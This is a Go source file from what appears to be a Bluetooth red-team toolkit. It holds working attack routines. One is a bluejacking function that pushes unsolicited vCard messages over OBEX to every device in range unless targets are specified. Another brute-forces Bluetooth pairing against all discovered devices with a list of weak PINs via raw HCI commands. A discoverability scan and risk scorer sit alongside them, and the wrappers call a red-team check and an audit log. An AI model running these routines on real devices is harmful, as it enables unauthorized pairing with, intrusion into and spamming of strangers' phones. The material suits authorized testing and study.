package bluez

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"
)

type SocialLayer struct {
	config     *AttackConfig
	blueConfig *BluejackingConfig
}

func NewSocialLayer() *SocialLayer {
	return &SocialLayer{
		config:     DefaultAttackConfig(),
		blueConfig: DefaultBluejackingConfig(),
	}
}

func (s *SocialLayer) Config(cfg *AttackConfig) *SocialLayer {
	s.config = cfg
	return s
}

func (s *SocialLayer) Bluejack(cfg *BluejackingConfig) *SocialLayer {
	s.blueConfig = cfg
	return s
}

func (s *SocialLayer) Bluejacking() (*BluejackingResult, error) {
	result := &BluejackingResult{
		MessagesSent: make([]string, 0),
	}

	devices, err := s.discoverDevices(8 * time.Second)
	if err != nil {
		result.Details = fmt.Sprintf("Bluejacking: discovery failed: %v", err)
		return result, nil
	}

	targets := devices
	if len(s.blueConfig.Targets) > 0 {
		targets = make([]DeviceInfo, 0, len(s.blueConfig.Targets))
		for _, device := range devices {
			for _, t := range s.blueConfig.Targets {
				if device.Address == t {
					targets = append(targets, device)
					break
				}
			}
		}
	}

	if len(targets) == 0 {
		result.Details = "Bluejacking: no target devices found in range"
		return result, nil
	}

	vcard := s.blueConfig.VCard
	if vcard == "" && s.blueConfig.Message != "" {
		vcard = buildVCard(s.blueConfig.Message)
	}

	var wg sync.WaitGroup
	var mu sync.Mutex

	for _, device := range targets {
		wg.Add(1)
		go func(d DeviceInfo) {
			defer wg.Done()

			addr := fmt.Sprintf("%s:%d", d.Address.String(), L2CAP_PSM_RFCOMM)
			conn, err := dialL2CAP(addr, L2CAP_PSM_RFCOMM)
			if err != nil {
				return
			}
			defer conn.Close()

			obexPacket := buildOBEXPush(vcard)
			conn.Write(obexPacket)

			mu.Lock()
			result.DevicesSent++
			result.MessagesSent = append(result.MessagesSent, d.Address.String())
			mu.Unlock()

			if s.blueConfig.Verbose {
				fmt.Printf("[BLUEJACKING] sent to %s\n", d.Address.String())
			}
		}(device)
	}

	wg.Wait()

	result.Success = result.DevicesSent > 0
	if result.Success {
		result.Details = fmt.Sprintf("Bluejacking: message sent to %d devices (%d total discovered)",
			result.DevicesSent, len(devices))
	} else {
		result.Details = "Bluejacking: no messages delivered"
	}

	return result, nil
}

func (s *SocialLayer) WeakPINBrute() ([]WPScanResult, error) {
	devices, err := s.discoverDevices(5 * time.Second)
	if err != nil {
		return nil, fmt.Errorf("WeakPIN: discovery failed: %v", err)
	}

	weakPINs := []string{
		"0000", "1234", "1111", "5555", "8888",
		"9999", "000000", "1212", "7777", "2222",
		"3333", "4444", "6666", "1122", "1313",
	}

	results := make([]WPScanResult, 0)
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 5)

	for _, device := range devices {
		wg.Add(1)
		go func(d DeviceInfo) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			for _, pin := range weakPINs {
				result := s.tryPINPair(d, pin)
				if result.Success {
					mu.Lock()
					results = append(results, result)
					mu.Unlock()
					break
				}
				time.Sleep(200 * time.Millisecond)
			}
		}(device)
	}

	wg.Wait()

	return results, nil
}

func (s *SocialLayer) tryPINPair(device DeviceInfo, pin string) WPScanResult {
	result := WPScanResult{
		Address: device.Address,
		Name:    device.Name,
		PinTried: pin,
	}

	sock, err := NewHCISocket()
	if err != nil {
		result.Details = fmt.Sprintf("socket error: %v", err)
		return result
	}
	defer sock.Close()

	connParams := make([]byte, 13)
	copy(connParams[0:6], device.Address[:])
	binary.LittleEndian.PutUint16(connParams[6:8], 0xCC18)
	connParams[8] = 0x01
	connParams[9] = 0x00
	connParams[10] = 0x00
	connParams[11] = 0x00
	connParams[12] = 0x01

	connCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_CREATE_CONN), connParams)
	sendHCICommand(sock.fd, connCmd)

	buf := make([]byte, 2048)
	deadline := time.Now().Add(5 * time.Second)

	for time.Now().Before(deadline) {
		n, err := recvHCIEvent(sock.fd, buf)
		if err != nil {
			continue
		}

		if n < 3 || buf[0] != HCI_EVENT_PKT {
			continue
		}

		switch buf[1] {
		case EVT_CONN_COMPLETE:
			if n >= 4 && buf[3] == 0x00 {
				if s.config.Verbose {
					fmt.Printf("[WPS] connected to %s\n", device.Address.String())
				}
			}

		case EVT_PIN_CODE_REQ:
			pinBytes := []byte(pin)
			pinParams := make([]byte, 7+len(pinBytes))
			copy(pinParams[0:6], device.Address[:])
			pinParams[6] = byte(len(pinBytes))
			copy(pinParams[7:], pinBytes)

			pinCmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_PIN_CODE_REQ_REPLY), pinParams)
			sendHCICommand(sock.fd, pinCmd)

			if s.config.Verbose {
				fmt.Printf("[WPS] trying PIN: %s for %s\n", pin, device.Address.String())
			}

		case EVT_LINK_KEY_NOTIFY:
			result.Success = true
			result.AuthSuccess = true
			result.Details = fmt.Sprintf("Weak PIN '%s' successfully paired with %s", pin, device.Address.String())
			return result

		case EVT_AUTH_COMPLETE:
			if n >= 3 && buf[3] == 0x00 {
				result.AuthSuccess = true
				result.Success = true
				result.Details = fmt.Sprintf("Successfully authenticated with PIN '%s' on %s", pin, device.Address.String())
				return result
			}

		case EVT_ENCRYPT_CHANGE:
			if n >= 5 {
				result.EncryptSize = buf[4]
			}

		case EVT_DISCONN_COMPLETE:
			return result
		}
	}

	return result
}

func (s *SocialLayer) DiscoverableScan() ([]DiscoverableDevice, error) {
	devices, err := s.discoverDevicesExtended(10 * time.Second)
	if err != nil {
		return nil, err
	}

	discoverable := make([]DiscoverableDevice, 0, len(devices))

	for _, device := range devices {
		d := DiscoverableDevice{
			Address: device.Address,
			Name:    device.Name,
			RSSI:    device.RSSI,
			Flags:   device.Flags,
		}

		classBytes := device.Class
		d.Class = uint32(classBytes[0]) | uint32(classBytes[1])<<8 | uint32(classBytes[2])<<16

		name, err := s.getRemoteName(device.Address)
		if err == nil && name != "" {
			d.Name = name
		}

		discoverable = append(discoverable, d)
	}

	return discoverable, nil
}

func (s *SocialLayer) getRemoteName(addr BDAddr) (string, error) {
	sock, err := NewHCISocket()
	if err != nil {
		return "", err
	}
	defer sock.Close()

	params := make([]byte, 10)
	copy(params[0:6], addr[:])
	params[6] = 0x01
	params[7] = 0x00
	params[8] = 0x00
	params[9] = 0x00

	cmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_REMOTE_NAME_REQ), params)
	if err := sendHCICommand(sock.fd, cmd); err != nil {
		return "", err
	}

	buf := make([]byte, 256)
	deadline := time.Now().Add(3 * time.Second)

	for time.Now().Before(deadline) {
		n, err := recvHCIEvent(sock.fd, buf)
		if err != nil {
			continue
		}

		if n < 3 || buf[0] != HCI_EVENT_PKT {
			continue
		}

		if buf[1] == EVT_REMOTE_NAME_REQ_COMPLETE && n >= 3 {
			if buf[3] == 0x00 {
				nameEnd := 3 + 32
				if nameEnd > n {
					nameEnd = n
				}
				name := strings.TrimRight(string(buf[3:nameEnd]), "\x00")
				return name, nil
			}
			return "", nil
		}
	}

	return "", fmt.Errorf("timeout")
}

func (s *SocialLayer) discoverDevices(timeout time.Duration) ([]DeviceInfo, error) {
	phy := NewPhysicalLayer().Config(s.config)
	return phy.scanDevices(timeout)
}

func (s *SocialLayer) discoverDevicesExtended(timeout time.Duration) ([]DeviceInfo, error) {
	return s.discoverDevices(timeout)
}

func (s *SocialLayer) AnalyzeDiscoverableRisk(devices []DiscoverableDevice) []string {
	risks := make([]string, 0, len(devices))

	for _, d := range devices {
		riskLevel := "LOW"
		reasons := make([]string, 0)

		if d.RSSI >= -60 {
			riskLevel = "HIGH"
			reasons = append(reasons, "Strong signal - close proximity")
		} else if d.RSSI >= -70 {
			riskLevel = "MEDIUM"
			reasons = append(reasons, "Moderate signal strength")
		}

		if d.Class&CLASS_SERVICE_OBJECT_TRANSFER != 0 {
			if riskLevel != "HIGH" {
				riskLevel = "MEDIUM"
			}
			reasons = append(reasons, "OBEX/File Transfer service exposed")
		}

		if d.Class&CLASS_SERVICE_TELEPHONY != 0 {
			riskLevel = "HIGH"
			reasons = append(reasons, "Telephony service exposed (Bluebugging risk)")
		}

		if d.Class&CLASS_SERVICE_NETWORKING != 0 {
			reasons = append(reasons, "Network service exposed (BlueBorne risk)")
		}

		if d.Class&CLASS_SERVICE_CAPTURING != 0 {
			reasons = append(reasons, "Capturing service exposed (Privacy risk)")
		}

		if d.Name == "" {
			reasons = append(reasons, "Device name not broadcast - stealth mode")
		} else if strings.Contains(strings.ToLower(d.Name), "default") ||
			strings.Contains(strings.ToLower(d.Name), "unknown") {
			reasons = append(reasons, "Default device name - likely misconfigured")
		}

		risk := fmt.Sprintf("[%s] %s - %s: %s",
			riskLevel, d.Address.String(), d.Name,
			strings.Join(reasons, "; "))
		risks = append(risks, risk)
	}

	return risks
}

func buildVCard(message string) string {
	return fmt.Sprintf("BEGIN:VCARD\r\nVERSION:2.1\r\nN:%s\r\nFN:%s\r\nORG:Bluejacking\r\nNOTE:%s\r\nEND:VCARD\r\n",
		message, message, message)
}

func buildOBEXPush(vcard string) []byte {
	vcardBytes := []byte(vcard)
	totalLen := 3 + 1 + 5 + 3 + len(vcardBytes) + 3 + 3

	packet := make([]byte, totalLen)
	offset := 0

	packet[offset] = 0x82
	offset++
	binary.BigEndian.PutUint16(packet[offset:], uint16(totalLen))
	offset += 2

	packet[offset] = 0x01
	offset++
	packet[offset] = 0x00
	offset++
	binary.BigEndian.PutUint16(packet[offset:], uint16(len(vcardBytes)+3))
	offset += 2

	packet[offset] = 0x46
	offset++
	binary.BigEndian.PutUint16(packet[offset:], uint16(len(vcardBytes)+3))
	offset += 2
	packet[offset] = 0x00
	offset++
	copy(packet[offset:], vcardBytes)
	offset += len(vcardBytes)

	packet[offset] = 0x49
	offset++
	binary.BigEndian.PutUint16(packet[offset:], 0x0003)
	offset += 2

	return packet
}

func Bluejacking(message string) *BluejackingResult {
	if err := checkRedTeam("Bluejacking"); err != nil {
		return &BluejackingResult{Details: err.Error()}
	}
	cfg := DefaultBluejackingConfig()
	cfg.Message = message
	auditOperation("Bluejacking", "broadcast", false, "package-level call")
	result, _ := NewSocialLayer().Bluejack(cfg).Bluejacking()
	auditOperation("Bluejacking", "broadcast", result.Success, result.Details)
	return result
}

func WeakPINBrute() []WPScanResult {
	if err := checkRedTeam("WeakPINBrute"); err != nil {
		return []WPScanResult{{Details: err.Error()}}
	}
	results, _ := NewSocialLayer().WeakPINBrute()
	if results == nil {
		return []WPScanResult{}
	}
	return results
}

func DiscoverableScan() []DiscoverableDevice {
	devices, _ := NewSocialLayer().DiscoverableScan()
	if devices == nil {
		return []DiscoverableDevice{}
	}
	return devices
}

func AnalyzeDiscoverableRisk(devices []DiscoverableDevice) []string {
	return NewSocialLayer().AnalyzeDiscoverableRisk(devices)
}

func generateBDAddrs(count int) []BDAddr {
	addrs := make([]BDAddr, count)
	for i := range addrs {
		for j := range addrs[i] {
			addrs[i][j] = byte(rand.Intn(256))
		}
		addrs[i][0] &^= 0x01
	}
	return addrs
}